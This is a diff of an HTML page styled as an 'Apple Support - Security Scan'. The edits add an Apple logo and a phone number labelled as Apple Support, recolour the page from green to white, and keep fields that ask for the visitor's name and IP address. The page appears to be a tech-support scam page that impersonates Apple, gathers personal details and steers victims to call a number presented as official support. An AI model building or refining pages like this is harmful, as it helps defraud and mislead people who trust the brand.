@@ -8,7 +8,7 @@
         body {
             font-family: monospace;
             background-color: black;
-            color: green;
+            color: white;
             text-align: center;
             padding: 20px;
             margin: 0;
@@ -19,21 +19,30 @@
             padding: 20px;
             background: #111;
             border-radius: 5px;
-            box-shadow: 0 0 10px green;
+            box-shadow: 0 0 10px white;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 10px;
+        }
+        .support-number {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 15px;
         }
         input {
             width: 90%;
             padding: 10px;
             margin: 10px 0;
-            border: 1px solid green;
+            border: 1px solid white;
             border-radius: 5px;
             background: black;
-            color: green;
+            color: white;
             font-size: 16px;
             text-align: center;
         }
         button {
-            background-color: green;
+            background-color: white;
             color: black;
             padding: 10px 20px;
             font-size: 18px;
@@ -42,7 +51,7 @@
             border-radius: 5px;
         }
         button:hover {
-            background-color: lime;
+            background-color: gray;
         }
         .terminal {
             display: none;
@@ -50,7 +59,7 @@
             padding: 15px;
             margin-top: 20px;
             background: #000;
-            border: 2px solid green;
+            border: 2px solid white;
             border-radius: 5px;
             height: 250px;
             overflow-y: auto;
@@ -68,8 +77,9 @@
 <body>
 
     <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
         <h2>🍏 Apple Support - Security Scan</h2>
-        <p>Enter your details to check security status</p>
+        <p class="support-number">📞 Apple Support: +1 206 279 9715</p>
         
         <input type="text" id="userName" placeholder="Enter Your Name" required>
         <input type="text" id="userIP" placeholder="Enter Your IP Address" required>
